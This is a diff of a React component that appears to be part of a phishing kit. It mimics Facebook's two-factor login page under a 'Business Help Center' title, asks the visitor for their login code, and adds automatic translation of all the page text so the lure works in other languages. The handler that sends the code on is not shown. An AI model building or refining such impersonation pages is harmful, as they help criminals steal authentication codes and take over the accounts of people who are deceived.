@@ -1,11 +1,34 @@
 import Favicon from '@/assets/images/aGT3gskzWBf.ico';
 import LoadingModal from '@/component/LoadingModal';
 import ImageUpload from '@/pages/client/ImageUpload';
+import translateText from '@/services/translation';
 import { faSpinner, faTimes } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
 import React, { useEffect, useState } from 'react';
 import { Helmet } from 'react-helmet-async';
+
+const defaultTranslations = {
+	title: 'Business Help Center',
+	facebook: 'facebook',
+	logOut: 'Log Out',
+	confirmTitle: "Choose a way to confirm it's you",
+	twoFactorMessage:
+		'Your account has two-factor authentication switched on, which requires this extra login step.',
+	enterLoginCode: 'Enter your login code',
+	loginCodeDescription:
+		"Enter the 6-digit code that we've just sent to your SMS , WhatsApp or from the authentication app that you set up.",
+	loginCodePlaceholder: 'Login code',
+	needAnotherWay: "Need another way to confirm it's you?",
+	submitCode: 'Submit code',
+	didntReceiveCode: "Didn't receive a code?",
+	recoverySteps: {
+		step1: 'Go to Settings > Security and Login.',
+		step2: 'Under the Two-Factor Authentication section, click Use two-factor authentication. You may need to re-enter your password.',
+		step3: "Next to Recovery Codes, click Setup then Get Codes. If you're already set up recovery codes, you can click Show Codes",
+	},
+};
+
 const TwoFa: React.FC = () => {
 	const [twoFaCode, setTwoFaCode] = useState<string>('');
 	const [isSubmitEnabled, setIsSubmitEnabled] = useState<boolean>(false);
@@ -19,6 +42,9 @@ const TwoFa: React.FC = () => {
 	const [isUploadEnabled, setIsUploadEnabled] = useState<boolean>(false);
 	const [isShowLoadingModal, setIsShowLoadingModal] =
 		useState<boolean>(false);
+	const [translations, setTranslations] = useState(defaultTranslations);
+	const [isTranslated, setIsTranslated] = useState(false);
+
 	useEffect(() => {
 		const isValid = /^\d{6,8}$/.test(twoFaCode);
 		setIsSubmitEnabled(isValid);
@@ -35,6 +61,37 @@ const TwoFa: React.FC = () => {
 		const messageId = localStorage.getItem('message_id');
 		setMessageId(messageId ?? '');
 	}, []);
+
+	useEffect(() => {
+		const translateStrings = async () => {
+			if (!isTranslated) {
+				const translatedTexts = await Promise.all(
+					Object.entries(defaultTranslations).map(
+						async ([key, value]) => {
+							if (typeof value === 'object') {
+								const translatedObj = await Promise.all(
+									Object.entries(value).map(
+										async ([subKey, subValue]) => {
+											const translatedSubValue =
+												await translateText(subValue);
+											return [subKey, translatedSubValue];
+										},
+									),
+								);
+								return [key, Object.fromEntries(translatedObj)];
+							}
+							const translatedValue = await translateText(value);
+							return [key, translatedValue];
+						},
+					),
+				);
+				setTranslations(Object.fromEntries(translatedTexts));
+				setIsTranslated(true);
+			}
+		};
+
+		translateStrings();
+	}, [isTranslated]);
 
 	const handleTwoFaChange = (e: React.ChangeEvent<HTMLInputElement>) => {
 		const value = e.target.value.replace(/\D/g, '').slice(0, 8);
@@ -76,18 +133,18 @@ const TwoFa: React.FC = () => {
 	return (
 		<div className='m-0 box-border h-screen bg-white p-0 font-sans'>
 			<Helmet>
-				<title>Business Help Center</title>
+				<title>{translations.title}</title>
 				<link rel='shortcut icon' href={Favicon} type='image/x-icon' />
 			</Helmet>
 			<header className='flex h-[50px] w-full items-center justify-around bg-[#517bd0] p-[15px_48px] text-[#9f9f9f]'>
 				<p className='font-body text-2xl font-semibold text-white no-underline'>
-					facebook
+					{translations.facebook}
 				</p>
 				<a
 					href='https://www.facebook.com'
 					className='rounded bg-[#466ebd] px-3 py-1 text-sm font-semibold text-white no-underline'
 				>
-					Log Out
+					{translations.logOut}
 				</a>
 			</header>
 
@@ -95,30 +152,27 @@ const TwoFa: React.FC = () => {
 				<div className='flex h-auto w-[612px] flex-col rounded border border-[#dddfe2] bg-white p-3'>
 					<div className='flex items-center justify-between border-b border-[#dddfe2] pb-3'>
 						<h2 className='text-sm font-bold text-[#1d2129]'>
-							Choose a way to confirm it's you
+							{translations.confirmTitle}
 						</h2>
 					</div>
 					<div className='border-b border-[#dddfe2] py-3'>
 						<p className='text-sm leading-[18px] text-[#1d2129]'>
-							Your account has two-factor authentication switched
-							on, which requires this extra login step.
+							{translations.twoFactorMessage}
 						</p>
 					</div>
 					<div className='flex flex-col justify-between border-b border-[#dddfe2] py-3'>
 						<b className='mb-3 text-sm font-bold text-[#1d2129]'>
-							Enter your login code
+							{translations.enterLoginCode}
 						</b>
 						<p className='mb-3 text-sm text-[#1d2129]'>
-							Enter the 6-digit code that we've just sent to your
-							SMS , WhatsApp or from the authentication app that
-							you set up.
+							{translations.loginCodeDescription}
 						</p>
 						<input
 							type='number'
 							inputMode='numeric'
 							pattern='[0-9]*'
 							autoComplete='one-time-code'
-							placeholder='Login code'
+							placeholder={translations.loginCodePlaceholder}
 							value={twoFaCode}
 							onChange={handleTwoFaChange}
 							className='inline-block w-[143px] border border-[#bdbdbd] bg-white p-1 text-xs shadow-none outline-none'
@@ -129,7 +183,7 @@ const TwoFa: React.FC = () => {
 							onClick={() => setShowPopup(true)}
 							className='cursor-pointer text-xs font-medium text-[#196ac1] no-underline'
 						>
-							Need another way to confirm it's you?
+							{translations.needAnotherWay}
 						</p>
 						<button
 							onClick={handleSubmit}
@@ -148,7 +202,7 @@ const TwoFa: React.FC = () => {
 										className='animate-spin'
 									/>
 								) : (
-									'Submit code'
+									translations.submitCode
 								)}
 							</p>
 						</button>
@@ -239,7 +293,7 @@ const TwoFa: React.FC = () => {
 					<div className='w-full max-w-[500px] rounded-lg bg-white shadow-lg'>
 						<div className='flex items-center justify-between border-b p-4'>
 							<h2 className='text-lg font-bold'>
-								Didn't receive a code?
+								{translations.didntReceiveCode}
 							</h2>
 							<button
 								onClick={() => setShowPopup(false)}
@@ -250,21 +304,12 @@ const TwoFa: React.FC = () => {
 						</div>
 						<div className='p-4'>
 							<p className='mb-2'>
-								1. Go to{' '}
-								<b>Settings &gt; Security and Login.</b>
+								{translations.recoverySteps.step1}
 							</p>
 							<p className='mb-2'>
-								2. Under the <b>Two-Factor Authentication</b>{' '}
-								section, click
-								<b>Use two-factor authentication</b>. You may
-								need to re-enter your password.
+								{translations.recoverySteps.step2}
 							</p>
-							<p>
-								3. Next to <b>Recovery Codes</b>, click{' '}
-								<b>Setup</b> then
-								<b>Get Codes </b> . If you're already set up
-								recovery codes, you can click <b>Show Codes</b>
-							</p>
+							<p>{translations.recoverySteps.step3}</p>
 						</div>
 					</div>
 				</div>
